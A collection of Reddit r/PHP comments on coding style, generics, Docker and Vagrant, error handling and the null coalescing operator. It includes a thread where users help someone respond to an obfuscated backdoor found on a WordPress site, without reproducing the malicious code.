I periodically create new accounts so I can argue with /u/colshrapnel about how shitty PDO actually is and assert that people should stick to native drivers.
Maybe I'm mistaken or misremembering, but, besides the `=`/`==` fear people are mentioning, it might be a habit for some who transferred from languages like C/C++ (or maybe it was C#). ***If** I remember correctly*, there were cases where something like `myVar == 0` would throw an exception if `myVar` was null because of type mismatches, but `0 == myVar` wouldn't throw because `0` is valid so the condition would just evaluate to `false`. 
&gt; common Is it, really? Serious question. Is there more than anecdotal evidence for this being common? If so, how common is it? I've made this mistake probably once, maybe twice, and I've been writing PHP, JS and similar languages for almost two decades now. Not to brag, it's just that I find it hard to believe that I'm an exception when it comes to this sort of thing.
This. There's no reason it would be bad practice and for me it's actually far more readable, especially when the line is longer. I can instantly see what the result of the right side expression is compared with.
The mods are not to blame, I would say that it's mostly framework X fanboys hating on framework Y because [insert-design-pattern-or-golden-bullshit-rule-taken-out-of-context-here], people are unwilling to be pragmatic and recognize that everything is not black and white. Our job is not to write perfect beautiful code or infinitly scaleable shit, Our job most often than not is to write functional software that works within the context it was built for.
Or `if (is_null($variable))`
Ok. Maybe "breaking" was too harsh for weakly typed language, but if you call methods not declared in return type you no longer depend on its contract. It doesn't concern abstract factory pattern, unless you could point me where exactly these new features are introduced (in diagrams or code on linked page). Take your time to digest possibility of writing apps with this constraint. I wouldn't want you to struggle with LSP or Law of Demeter unprepared.
It pops up in my code because PHPStorm's `is_null($var)` clean up refactors to `null === $var`, and I'm too lazy to swap 'em.
LSP has nothing to do with that. Its not about returning types its about whether B should extend A in the first place. Like the square/rectangle example always used to describe it. if you have a class Animal extended by Wolf its totally valid to have a Zoo interface that returns Animals and WolfZoo that returns Wolfs through same methods. None of this has anything to do with Demeter though.
Actually classes that dont violate LSP by very definition are compatible and should be usable like this. "Functions that use pointers or references to base classes must be able to use objects of derived classes without knowing it" This literally means that if you were writing against an interface that returns A, but the concrete implementation of that interface returns B that extends A, if A and B dont violate LSP, you should be totally fine.
I don't know what level of evidence you would accept. I think every developer has made this mistake at least once. It's valid syntax in C and PHP, so your compiler will do nothing to warn you, although your IDE might. Some languages use "=" as an equality operator and if you are switching between one of those and PHP you are almost bound to make this mistake more often. Doing things the Yoda way is much less of a burden than repeating this mistake. If you don't suffer from it, great! Remember that most programmers are probably not at your level, though.
Just to get that right, if a `Product` has no seller assigned or a seller has no phone assigned you would throw an exception? I think this is one case where it's okay to do the first check, if a database field for example is nullable, I think it's totally correct to also return null and not just throw exceptions if the value is null. For other methods I agree, if something can't be found, throw an exception or return the value, but don't return multiple data types,.
Right. Actually, I'm going to change it from `$product-&gt;getSeller()` to `$productMapper-&gt;getSeller($sellerId)` because that's actually closer to the real-world example I'm criticizing.
Thanks for your work! Good job! Agile Toolkit is a good framework and Agile UI is a great choice for starting a frontend MVP.
"Most of these changes were prompted by feedback from early adopters." - I'm glad you're listening to what developers say.
You must be fun at parties
I wasn't dragging this discussion into LSP or LoD - quite the opposite. I said that you need to overcome working with return types (and with them only) as part of the contract to fight LSP or LoD constraints. Seriously stop trolling me.
Thanks for letting me know about all that stuff. Yeah I agree with pretty much all of it. &gt; Why are all these functions global ... At least make them classes And oddly enough, the heading above them on the doco page is "Available Methods", hah. &gt; A class with almost 3.4K lines, almost 200 methods. Shit... even my base active record class that all my models extend from, which is already what could be called a ["god object"](https://en.wikipedia.org/wiki/God_object) is only about 1000 lines. &gt; One of the main faces of Laravel says that type hints, return types, interfaces and traits at "visual debt" and make code dirty? https://laracasts.com/series/php-bits/episodes/1. All of these features make your code easier to maintain, produce less bugs and make it easier to build upon. It's basically saying ignore all of the new features that other languages have and go back to PHP4 days. Yeah that's very a strange recommendation... removing typehints... wtf. Stuff like typehints is actually one of the things that was keeping me on PHP, rather than moving to JS, where you have to use stuff like typescript for this kind of stuff. I'm going to miss it. 
**God object** In object-oriented programming, a God object is an object that knows too much or does too much. The God object is an example of an anti-pattern. A common programming technique is to separate a large problem into several smaller problems (a divide and conquer strategy) and create solutions for each of them. Once the smaller problems are solved, the big problem as a whole has been solved. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/PHP/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^| [^Source](https://github.com/kittenswolf/WikiTextBot) ^| [^Donate](https://www.reddit.com/r/WikiTextBot/wiki/donate) ^] ^Downvote ^to ^remove ^| ^v0.28
Thanks for this Freek, really interesting!
Would've killed for this 2 months ago, saved for the future. Personally Vagrant slows my programming down, just for the one off chance there's some minute difference between my machine and production that testing show how doesn't catch.
There are scenarios where it is useful: ``` class Foo {} class Bar extends Foo {} interface FooCollection { function getItem() : Foo; } interface BarCollection extends FooCollection { function getItem() : Bar; } function processFoos(FooCollection $fc) {} function processBars(BarCollection $fc) {} ``` Also, for factory type classes. They are not amazingly common.
Ah okay, I see. Yes, I agree on that, if a user requests `/user/15` and the user `15` does not exist, an exception should be thrown. I thought you meant, for example, we have a user, and this user has a last name, but last name is optional (nullable), so when I access `$user-&gt;getLastName()` I should get an exception, because in that case I wouldn't throw one. I just misunderstood you then.
&gt; A case for generics at Libcast At this point, people don't need to make a case for generics. Almost certainly, a supply of cold hard cash for generics would be more productive.
I wonder what's the state of that rfc...
If `BarCollection` inherits from `FooCollection` they should be indistinguishable (in methods they share). You may call it usefull, but why insist on return types then. Hell with it, make dummy interface, implement whatever method you like and call it OOP.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
What a complete waste of my time. TL;DR turn on error reporting 
This was how we did it in 2011. Now we use Vagrant.
Nope. I'm not gonna use Docker that has horrible perf. issues. My in-memory tests (not even talking of of real functional tests) are taking 30s with Docker and 2s locally. For the function it takes 5min instead of 2. So we do have Docker machines, but we still rely on the local machine for a couple of things and for most projects like libraries for example, I certainly won't ever use a Docker machine
Regarding good/bad practice: pick one codestyle and pin it down in your build tools (PHPCS).
Could someone maybe ELI5 what purpose generics have? I've ever only developed stuff in PHP and I sincerely can't understand what this is. This article doesn't help me one bit and I cant seem to wrap my head around the example and the linked RFC draft just makes me more confused. It's probably because I'm inexperienced, but I'd really like to understand this.
Pro-tip: this inspection has settings for Quick-Fix style (Joda vs regular). PS: I'm lazy too, so using defaults s well.
How about: - True multithreading with coroutines and channels (similar to Go). Yes, there is a pthreads extension. No, it does NOT work when PHP runs under your web server, so it's mostly useless. - Async programming like Node.js - More support for Windows Server. Stop treating the Windows version like a second-class citizen.
Well you started strong but ended meh.
I think it's in total standby because of questions about union types, nested types, ... without a response. 
Important information: some coders like to disable error_reporting for warnings or everything at all, but you shouldn't disable it, because even "warnings" should be treaded like errors. Fix everything and manage/log every error/exception that occurs, so you can show a custom error page for the user in production, but still have important logs which tells you that there is an error you need to fix.
Source: https://github.com/php/web-php/blob/d897477592/js/common.js#L99-L364
From `https://php.net/cached.php?t=1500560403&amp;f=/js/common.js`: Mousetrap.bind('up up down down left right left right b a enter', function() { $(".brand img").attr("src", "/images/php_konami.gif"); }); Mousetrap.bind("?", function() { $("#trick").slideToggle(); }); Mousetrap.bind("esc", function() { $("#trick").slideUp(); $("#goto").slideUp(); $("html").off("keydown"); $("html").off("keypress"); }); Mousetrap.bind("G", function() { var n = $(document).height(); $.scrollTo(n, 10); }); Mousetrap.bind("g h", function() { window.location.href = "/"; }); Mousetrap.bind("g g", function() { $.scrollTo(0, 10); }); Mousetrap.bind("g p", function() { var link = $("link[rel=prev]").attr("href"); if (link) { window.location.href = link; } }); Mousetrap.bind("g n", function() { var link = $("link[rel=next]").attr("href"); if (link) { window.location.href = link; } }); Mousetrap.bind("b o r k", function() { var bork = function(text) { var subs = [[/a([nu])/g, 'u$1'], [/A([nu])/g, 'U$1'], [/a\B/g, 'e'], [/A\B/g, 'E'], [/en\b/g, 'ee'], [/\Bew/g, 'oo'], [/\Be\b/g, 'e-a'], [/\be/g, 'i'], [/\bE/g, 'I'], [/\Bf/g, 'ff'], [/\Bir/g, 'ur'], [/(\w*?)i(\w*?)$/g, '$1ee$2'], [/\bow/g, 'oo'], [/\bo/g, 'oo'], [/\bO/g, 'Oo'], [/the/g, 'zee'], [/The/g, 'Zee'], [/th\b/g, 't'], [/\Btion/g, 'shun'], [/\Bu/g, 'oo'], [/\BU/g, 'Oo'], [/v/g, 'f'], [/V/g, 'F'], [/w/g, 'w'], [/W/g, 'W'], [/([a-z])[.]/g, '$1. Bork Bork Bork!']]; for (var i = 0; i &lt; subs.length; i++) { text = text.replace(subs[i][0], subs[i][1]); } return text; }; $('*:not(iframe)').contents().filter(function() { return this.nodeType === 3 &amp;&amp; /[^\t\n\r ]/.test(this.textContent); }).each(function(_, el) { el.textContent = bork(el.textContent); }); Mousetrap.unbind("b o r k"); });
 - Nay - Yay - Meh
&gt; they should be indistinguishable If you're using BarCollection as a FooCollection, then they are indistinguishable due to LSP. If you're using BarCollection as a BarCollection, and not as a FooCollection, then you want the contracts on BarCollection's method to be precise.
I once had a son who used Docker on Windows, and let me assure you: it was no laughing matter. 
&gt; Its basically impossible to write any kind of complex application without this. Yep, that is why there are no complex applications in use today written in PHP.... I get what you are asking for but that sentence is just a tad hyperbolic 
They basically give you type safety while allowing you to still be flexible. Say you have a List, and you want it to hold integers and floats, then you'll have to create an IntList and a FloatList if you want return type and parameter type safety. Generics would allow you to create a List&lt;int&gt; and a List&lt;float&gt;.
Drop inheritance in BarCollection and problem's gone. Use traits for code reuse.
Generics are basically just a placeholder for a class that will be specified at runtime. For example, if you have a class used as a container of some sort that is used to store a list of objects (lets call this object A), We could hard code the name of the class we need to store and then create some methods (add, remove, update, etc) for these objects. However, a lot of this code is going to be pretty "generic" so to speak, and would probably work fine for storing ANY type of class, not just class A as implemented above. With generics, you don't specify a class to use within this container, and instead specify a placeholder that will be replaced at runtime with the actual class. The advantage of this, as opposed to specifying a generic php $variable inside our container, is that the runtime will implement full type hinting on our codebase, reducing the change for errors and bugs. Generics are pretty common in compiled languages like Java and are admittedly pretty handy. Having or not having them isn't completely necessary for writing good reusable code, but it certainly makes it easier. 
You know issues are not exclusive, right?
Of course. However, I think there are a lot more pressing needs for PHP than adding generics.
&gt; More support for Windows Server. Stop treating the Windows version like a second-class citizen. y tho
Almost all generics threads have had a guy who questioned or inquired about the usefulness of generics. I think these routine threads are still useful for clarifying misconceptions and settling some debates on how the community wants it implemented. I'm attempting an implementation (loosely based on the existing RFC) and my greatest concern so far is how much it'd suck if I manage to complete it but the RFC fails because "I should just use java".
For you, it is. I even agree with you in the first 2 points. However, the community is large enough to have multiple people championing multiple ideas at the same time.
Also, if still a blank page even after properly configuring error reporting, then view the html source in browser. Literally 5 minutes ago I had to help a team member with this, because the error was echoed inside a hidden div.
Generics are like having types as a parameter for a class/function/type. This allows you to impose type constraints and make code "more generic" (hence the name) without having to write explicit classes or functions for every possibility. For example: let us suppose we have a function that requires an array of objects of a specific type. At present, in PHP, there is no way to typehint that. You would have to verify the type of every member of the array, in a manner similar to how you used to have to check the types of parameters before PHP added typehinting support. function example(array $fooArray) { foreach($fooArray as $foo) { if(!($foo instanceof Foo)) { throw new InvalidArgumentException(); } } //Now do real work } That sucks. We have to iterate over the array and check every argument's type. But, we can create a class that enforces that constraint, so we don't have to check it whenever we call our example function: class ArrayOfFoo implements ArrayAccess { public function offsetExists($offset) { ... } public function offsetGet($offset) { ... } public function offsetUnset($offset) { ... } public function offsetSet($offset, Foo $value) { $this-&gt;data[$offset] = $value; } } And wherever we need to enforce that constraint, we can typehint on `ArrayOfFoo` function example(ArrayOfFoo $fooArray) { ... } However, if we also need an array of `Bar`, now we have to create an `ArrayOfBar` class that largely duplicates our `ArrayOfFoo`. Duplication is bad, and doesn't scale. You would have to create a new `ArrayOf…` class for each type you want an array of. One option would be to create a base `ArrayOf`class that implements our logic to constrain its contents to a specified type, and use an input parameter to the constructor to specify the type constraint: class ArrayOf implements ArrayAccess { private $type; private $data = []; public function __construct($type) { $this-&gt;type = $type; } public function getType() { return $this-&gt;type; } public function offsetExists($offset) { ... } public function offsetGet($offset) { ... } public function offsetUnset($offset) { ... } public function offsetSet($offset, $value) { if($value instanceof $this-&gt;type) { $this-&gt;data[$offset] = $value; } else { throw new \InvalidArgumentException(); } } } So now, we can create a ``new ArrayOf(Foo::class)``, or ``new ArrayOf(Bar::class)``, and the type check in `offsetSet` verifies that everything added to the array is of the proper type. Now, we're halfway there. The problem is, we still can't typehint on "an array of Foos". We still have to test this in code: function example(ArrayOf $fooArray) { if($foo-&gt;getType() !== Foo::class) { throw new \InvalidArgumentException(); } } Or else, create a bunch of classes that look like: class ArrayOfFoo extends ArrayOf { public function __construct() { parent::__construct(Foo::class); } } function example(ArrayOfFoo $fooArray) { } However, with generics, we can codify this in the type system. So, instead, our class might look like this: class ArrayOf&lt;SomeType&gt; implements ArrayAccess { private $data = []; public function offsetExists($offset) { ... } public function offsetGet($offset) { ... } public function offsetUnset($offset) { ... } public function offsetSet($offset, SomeType $value) { $this-&gt;data[$offset] = $value; } } Here, we have provided the class itself a type parameter named `SomeType`, which can be used in its body: in this case, in its `offsetSet` method to constrain the $value parameter. It's important to note that `SomeType` is not a type that actually exists in the code; it is a _placeholder_ for a type that will be passed in when you actually create an object of this class. Now, we don't need to implement a type check manually, because PHP's type system will do it for us. We can create a new one and use it like this: function example(ArrayOf&lt;Foo&gt; $fooArray) { //do stuff } $fooArray = new ArrayOf&lt;Foo&gt;; $barArray = new ArrayOf&lt;Bar&gt;; Now, if we call `example($fooArray)`, our function will be happy, because it will get the array of `Foo` objects (enforced by the type system) that it is expecting. If we call `example($barArray)`, we will instead get an error, because we have not passed in a parameter of the expected type. And we did not have to write separate classes for each type or manually do _any_ of the type checking. Even better, this will work for _any_ type we might need an array for, so you could create a `new ArrayOf&lt;string&gt;` (which wouldn't work in the original `ArrayOf` implementation because `string` is not a class). You could even nest the types, and create a `new ArrayOf&lt; ArrayOf&lt;Foo&gt; &gt;` to create a nested array of array of Foos. (Note that this specific example would not work as-written because narrowing the type in the `offsetSet` function is not permitted by PHP's inheritance rules. It is intended as an illustrative example only.) With that in mind, you should now be able to go back to the example for `class Entry&lt;KeyType, ValueType&gt;` in [the RFC](https://wiki.php.net/rfc/generics) and be able to understand what it is doing.
&gt; Stop treating the Windows version like a second-class citizen why would we put effort in supporting windows? use a container already
Why would I use a container? Why bother with Linux / Unix?
You must have so many friends.
He too stubborn. Fear things break
&gt; PHP was written for the non-programmer, it is many hobbyists native tongue. The reason PHP is so easily adopted is because it is an easy language to learn and write. I don't really see that as being relevant. How would that change? It's not like new programmers would need to use it. I don't have any opinions on the pthreads specifically, especially whether or not it's a core feature. Just a more general thought as someone who started with PHP3 and has enjoyed what it has grown into. But the other points being made probably do make sense. Anyone that is going to use it can easily install it themselves I spose. Although I think stuff like this might become more relevant with the way webdev is going in generally with async, event/loop etc, real time websockets etc. 
I, too, think PHP internals doesn't have enough drama and needs lobbyists and bribes to enter its final form.
IMO considering Yoda conditions a "WordPress coding standard" is enough reason I'm my mind to dispense with them entirely.
Oh look, it's *this* thread again.
&gt;True multithreading with coroutines and channels (similar to Go). Yes, there is a pthreads extension. No, it does NOT work when PHP runs under your web server, so it's mostly useless. 1. [PHP has coroutines](https://nikic.github.io/2012/12/22/Cooperative-multitasking-using-coroutines-in-PHP.html). 2. What makes you think that if it had native multi-threading, it would be any different to what pthreads currently offers? That is, why do you think it would magically work with your web server of choice?
Amazing reply. Thank you
No, the English language has an order to things. It would sound strange if you said, "If white is the dog, then walk it." You would definitely say, "If the dog is white," or `if ($dog == 'white')`. That isn't to say you should *never* reverse it, just that it shouldn't be a rule that you do it all the time.
WordPress has absolutely *terrible* coding standards. They're not even close to PSR-2. It's like going back to all the mistakes we made 15-20 years ago. Definitely not a good argument for choosing a best practise.
I don't agree. It's important to require Jimmy to write adequate tests to ensure that any such mistake is quickly identified and corrected, and Jimmy learns from his mistake.
&gt; common error [citation needed] 
&gt; I don't know what level of evidence you would accept. I think every developer has made this mistake at least once. That doesn't mean you have to institute a weird coding style. Everyone sometimes misses a semicolon at the end of a statement. The solution is to check as you type, not to enforce some weird rule like "always add a comment after every line to prove you've remembered to put the semicolon".
People who say "You must be fun at parties" are always the least fun people. 
Okay.
&gt; "No there aren't really any BC breaks. Well, of course, you need to check every release of every module to see if they've changed something but you do that once per release and it's fine." Isn't that the very definition of BC breakage? Eh, you'll find little sympathy from me. On my PHP project, I'm stuck with freakin CodeIgniter. Though at least CI is small enough I can at least hack around or on it when I have to. But otherwise it feels like going back to the 90's and writing cgi-lib.pl apps 
&gt; It's incredibly stupid to blame the tools for your inability to use them without hurting yourself. When a tool is always flying apart under normal conditions and causing injuries, normal people stop using the defective tool.
b/c you can strongly type hint arrays and thus build a single class that handles a lot of things generically. Imagine a Collections class; Collection&lt;MyType&gt;() generic ... vs MyTypeCollection current what you need to do. More or less a lot better way to make Code Reuse for enforcing type safety.
Because some people want to watch the world burn. 
Imo, there's no way to test a 3rd party API integration properly when they don't provide a sandbox for testing. It's as easy as that. What we did in such cases (after talking to the 3rd party API devs for sure), was, that they for example provided us a second account (yes, on their live database), which we could then use as a sandbox.
Btw. OT (but just comes into my mind)... We also had a 3rd party finance API integration with sensitive data. Their sandbox only worked with production login credentials and for sure we didn't want to share those among all developers. So what I did was, I messages the management of that company and explained to them about the security side. It took them a few months, but they changed it. ;)
`The Symfony Flex server` `Flex Bot` Can someone elaborate on what these are, how they integrate w/ flex and if you can use flex without any 3rd party server stuff?
That's correct. Now try to contribute to the conversation with something relevant to the discussion. You're analogy is reaching. Can you give an example as to how Laravel might "fly apart"?
looks like a backdoor/logger!
Oh no! What are all the ililiilil? and does this mean he logs all key strokes entered when you visit the site?
From one point of view their goal should to find smallest thing in your RFC to reject it. Even if you implemented this feature, they will have to maintain it. Don't know how much pain it is, but probably it is. I think that discussing this kind of RFC which really will make PHP a slightly better language require strong and clean implementation with high code coverage, bunch of real-world examples (what we could do with generics) and easy way to play around with this implementation (gladly there are 3v4l.org). This is huge amount of work.
I develop actively in php for 8 years. Before that I have developed in autoit scripting languages which uses "=" for equality. I have never done this mistake. Nowadays, I commonly use assignments in ifs.
Obfuscation, to make it harder to read when all the variables are a jumble of very similar letters 
There's nothing here to log keystrokes, but its certainly logging GET/POST, which means it's logging user/pass authentication attempts. A bit of refactoring of the variable names and some indenting and it would be a lot more obvious. You should do that. You should whack that fucking install of WP asap and find out how they changed your include() files. 
Is there anyway to track this ass hat down? I noticed it says something about a spider file in the handlers folder. 
And by Whack you mean completely uninstall word press?
You should look at https://codex.wordpress.org/Hardening_WordPress and start from there.
It lets someone upload scripts to your site. There's an IP address in there that WHOIS says is Ukrainian.
Tried to decode it a bit, it seems to look through the files on your server, and maybe try to steal your password? https://pastebin.com/M05s5WPN
2) amp
Interesting point. I've never felt the need to use Yoda notation as I have never ran into the =/== problem, but this is a good argument for why to use Yoda.
ilililili is a way to . obfuscate the variable -do . a replace on that to somevar and it will make more sense. It seems mostly harmless but if that code is present i'd consider all files compromised! Re-install wordpress and change all pw's!
I've used pthreads a lot and there are some problems. For example, it just creates processes and passes serialized data between them. So, no resources, no other shared objects and so on. I also has problems with composer autoloader - it was not working properly inside threads and I had to run threads on maximum level of isolation and require autoloader file inside of each thread manually. Maybe it has changed, but it was really "Share nothing". Threads were automated forks last time I used them. 
go pay him a visit he's ukraine'ien
Best you can get is an IP. But there's almost nothing you can do with that and proving they were behind the act is equally difficult. Best to chalk as learning EXP and harden your next install. Be sure to stay on top of updates, WP installs are the easiest target for widespread hunts for vulnerabilities.
Yeah. Look into all the DB objects too, all posts and articles, and plug ins. A wide open "uploads directory is very commonly misconfigured and an easy way in.
Null Coalescing Operator in PHP &gt;= 7 &lt;?php $array = []; var_dump($array['foo'] ?? '');
`$array['index'] ?? null`, provided you use PHP &gt;= 7.
I have a somewhat working patch that adds type-parameters to traits: trait Maker&lt;T&gt; { function make(...$args): T { return new T(...$args); } } And then you have to pass type args when you `use` them: class FooFactory { use Maker&lt;Foo&gt;; } It's a start, anyway.
What's your design like? New opcodes, etc?
So this will output empty string? Is there away to add that as the default behavior without the operator? 
&gt; So this will output empty string? Yes. &gt; Is there away to add that as the default behavior without the operator? Nope, that's what the operator is for. Wouldn't exists otherwise. It's the only way I know to have the behaviour of an isset check without the ugly if/else or ternary `isset($array['foo'])? $array['foo']: '';`.
Thank you
Theoretically you could do so by wrapping an array into a class implementing ArrayAccess and doing your checks there. But please, please, please don't do this. It's a terrible idea.
Welp you have probably been pwnd. Check if it has created any root accounts on your servers too (it has happened to someone I know).
The first function is basically a simple penetration tester for PHP https://pastebin.com/HCpiUrRa
And what's with "While in beta, private repositories are free."?
Until you roll up your sleeves and go to work I don't think you'll get much sympathy or help. If you want these features then start working on them. It's how it works. If you don't have the skills and you want the feature badly enough then learn them. It's what I did. It's what nearly every contributor does. If you need me I'll be in my corner working on the features I care about, like type parameters on traits.
ugh, when i say "new" I mean "more" :) this would help us speed things up!
Windows is a second class citizen unless you're gaming.
96.3 percent of the top 1 million web servers are running Linux
I don't have much of a design yet as I'm still experimenting to understand some internals. So far I tried a lazy approach where I would duplicate zend_class_entry at compile time for ast generic_class_ref (which is class_name_reference with generic type arguments: Foo&lt;int, string&gt;) and pass that zend_class_entry to existing opcodes (ZEND_NEW, etc). I figured the memory usage from additional zend_class_entries wasn't going to be a big deal since that's what we do today in userland. But I dropped it when I realized the source class entry might not be available at the time of compiling the class_name_ref and can't be autoloaded at that point. This weekend I'll get back to it after a few weeks break and I plan on introducing new opcodes for generic_class_ref and adding support for these in existing opcodes. Ex: ZEND_NEW would copy the type arguments to the zend_object, ZEND_BIND_TRAITS would translate the parameters into their arguments before binding, ZEND_ADD_INTERFACE would validate against the interface with translated type params. I'm currently experimenting on classes and leaving functions/methods/closures for later. As far as the specification goes, the main difference is lack of type inference in favor of gradual typing. Ex: class Builder&lt;T&gt; { public function __construct(T $object); } $builder = new Builder(new Something); is not the same as $builder = new Builder&lt;Something&gt;(new Something); but rather Builder&lt;mixed&gt; where T IS_UNDEF and thus skipped in all checks Adding generics to existing classes/interfaces (core or userland) should remain fully BC, since they'll only be enforced when specified. We discussed an example for this in [the previous generics thread](https://www.reddit.com/r/PHP/comments/7c7rtm/sharing_on_older_blogpost_about_generics_in_php/dpq1s5m/?context=1), but I'll reiterate: interface ArrayAccess&lt;Tk, Tv&gt; { public function offsetSet(Tk $key, Tv $value); } class Collection implements ArrayAccess { public function offsetSet($key, $value); } class Collection&lt;Tk, Tv&gt; implements ArrayAccess&lt;Tk, Tv&gt; { public function offsetSet(Tk $key, Tv $value); } class AnimalCollection implements ArrayAccess&lt;int, Animal&gt; { public function offsetSet(int $key, Animal $value); } 
I don't like it, but the most concise solution you your question is $foo = @$array['index']; It's bad practice though, and you shouldn't get in to the habit of it. Null coalesce (??) Is a better option.
&gt; Why bother with Linux / Unix? http://www.zdnet.com/article/linux-foundation-finds-enterprise-linux-growing-at-windows-expense/ Why bother with windows?
Standard Sensio procedure. They give a bit more to entice you and charge for it later once it's stable. Blackfire was amazing until the pricing came in
 The design I went with has a `FETCH_TYPE_PARAMETER` opcode which then feeds the concrete `zend_type`into the `NEW`, `INSTANCEOF`, etc opcodes. However, what if concrete type was an `array` and the opcode was `NEW`? The `ZEND_NEW` op won't have the type parameter information to generate a proper error, which ought to look like `"Unable to do new T where T = array"` or something. I'm currently toying with generating new opcodes that understand type parameters, such as `ZEND_PARAMETERIZED_NEW` instead of `ZEND_NEW`, `ZEND_PARAMETERIZED_INSTANCEOF` instead of `ZEND_INSTANCEOF`, etc. These know both the parameterized type and the intended operation which permits them to perform type checking with helpful errors, all without penalizing existing `NEW` and `INSTANCEOF` opcodes. What do you think?
Thanks man :)
Industry sponsorship is an important part of the OSS community, and has been since the beginning. Injecting resources (ideally people) to solve a particular need is useful all round - the company gets support from the community, and the community gets support from the community. Rejecting it out-of-hand as "lobbying" is short-sighted in the extreme.
The short answer is “nothing good”. Time to restore to a clean backup, or reinstall the site clean, and ensure everything is on the latest stable version. 
You can absolutely test third party API's without a sandbox. You don't test for example that you get money in your paypal from a call, or that you use HTTP, but rather that when called internally a method generates a payload matching what you expect to send. How deep your integration and testing goes does depend on things like sandbox environments, but not having these features is not the end of the world.
At some point you gotta make a living and charge for things, that looks reasonable no? And FYI you can still use Blackfire for free, it's just more limited.
I'm not questioning any of that. I simply answered a question. Thanks for your perspective tho
Looks like a DOS attempt
Make a wrapper class that implement `ArrayAccess` http://php.net/manual/en/class.arrayaccess.php
Just array_filter.
My only real issue with this is that it’s one hell of a god class and there’s no tests, but it does seem promising
One option that works in some situations is put the xdebug configuration commands in a special ini file and only load that version with the -c command line when you want to use xdebug for debugging. In that cases, regular usage of PHP will not be using xdebug or slowed down by it. Running local vagrant is another option. 
Isn't that a notice errror? Just turn off the E_NOTICE flag. Or maybe it is an E_WARNING.
/r/php is a weird place. For the every ridiculous whim, grounded by nothing but ignorance, there is always a bunch of people willing to help. Nobody to tell that error messages are the most fucking important thing in the programmer's life to be such easily dismissed. Nobody to tell that every variable should be defined before use. Nobody to tell that silly questions are just off topic. Come on folks, grow up, don't make a discussion from the every question asking what would 2 x 2 be
Thank you very much for the time and effort you put into such an elaborate answer. I understand it now. This was really great.
No it’s a fatal error. Wish it was just a notice
Rude. Bro I’m just trying to get the QA off my back and maybe do a little less typing. No need to get philosophical on me.
We have this piece of code which generates errors for invalid string offset access based on where it is use: https://github.com/php/php-src/blob/master/Zend/zend_execute.c#L1105 That's an option. A slightly more elegant option would be to instead add a flag to `FETCH_TYPE_PARAMETER`, which indicates the context where it is used. I would generally recommend against mass-duplicating a lot of opcodes to add type parameter handling to them. Or maybe have `FETCH_TYPE_PARAMETER` and `FETCH_CLASS_TYPE_PARAMETER` and generate the latter where only classes are allowed and generate a slightly more generic error there. Also, can we check at compile-time whether the type parameter has to be class-like?
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [php/php-src/.../**zend_execute.c#L1105** (master → 33b0944)](https://github.com/php/php-src/blob/33b094479b7d2a61ecee52e7ce2bd389426349e9/Zend/zend_execute.c#L1105) ---- ^(Shoot me a PM if you think I'm doing something wrong.)
"Look bird" is poor argument in serious debate, unless that's debate about being list while looking for birds.... Investigate what's not on pair and how that can be remedied in windows. Make new post.
Put an abstraction in front of the third party api, like a gateway class or something, it will work as a contract to the external service. Then you can unit test it with a mock implementation that doesn’t hit the network. Doing that you’ll be able to test the contract only, really testing the integration needs to be done manually. My 2 cents
You mustn't behave like a child. QA, as well as PHP error messages, are given to you for the good. Both are trying to make a human out of a caveman of yours in terms of programming. Learn how to be a good coder instead of just seeking a way "to get the QA off your back".
Good idea for other setups. We're working with php-fpm and new ini files can only be provided by restarting the service/docker container.
Cool article mate! It's great that you gave real-life practical examples. I also didn't know, that Agile UI lets you built an entire app without any custom HTML. 
&gt; The ZEND_NEW op won't have the type parameter information to generate a proper error Don't you store the params in the CE?
Doesn't matter whether this framework good or bad (though it's rather [bad](https://www.reddit.com/r/PHP/comments/573fuh/kraken_distributed_async_php_framework/)) SAPM links are NOT to be tolerated here. 
You said: &gt; Our plan is to back up all the files and run an antivirus scan on it and look through which files have injected code like this to get rid of it. No. Do not do this. Nothing good will come of it. You should consider what is now on the server as "lost". Roll back to a version from _before_ the security infraction took place, and fix the security issue that caused this. The current code will have many backdoors, and I can guarantee you will not find all of them. Do not try to salvage it, you will only lose massive amounts of time and frustration.
Its very subjective to say that its best PHP Framework, everybody see this as competition, actually its not.
Holy God this is bad. Who in their right mind compares an `echo` statement to spawning a web server and then claims the echo statement is more concise? What the *fuck* are you *even doing*?
&gt; We tweaked already the f*ck out of docker because the filesystem sync is very slow on symfony with 20k+ files. Just PM me if you need help (We work on ~300ms debug toolbar measured time). I'm interested in hearing more about this, since I get *way* worse response times. 
You could provide a debug and a non-debug virtual host with whatever production system you are using. But you should want to find out if your bug depends on docker on anything else about your setup. Check out the ease of setting up multiple virtual hosts with vagrant - https://laravel.com/docs/5.5/homestead. Look first if you can reproduce the bugs in easy development environments. 
&gt; That blog post is pretty trash though. He complains about facades, when they can be injected. Nothing is stopping stupid developers from creating wrappers to do hackish things with the framework. As I said, write a techincal rebuttal and people will take you seriously. &gt; It's incredibly stupid to blame the tools for your inability to use them without hurting yourself. Take some classes, read some books, and stop blaming other developers for your inability to write good software. The guy who wrote this blog posts gives classes on how to write good software. He gives talks on how to write good software. This is not some random guy, this is someone who is considered very respected within the PHP Community. If Laravel is that complicated that to write good software with it requires special training to do it properly instead of using standard software development practices. Where is the value in a company using it? All of a sudden they can't get software developers, but Laravel developers. This to me sounds like a flawed tool, hence why I am not a fan of it for long-lived projects.
Better choices, in my opinion, would be Zend Framework and Symfony Framework. Both are built on well defined, well used best software practices such as SOLID, maintain a high level of BC, provide LTS, etc. Once you start actually building with it, you can decouple from the Framework so much that can easily switch to another Framework.
Gotta love how some people still try and compare them. They both have their uses. 
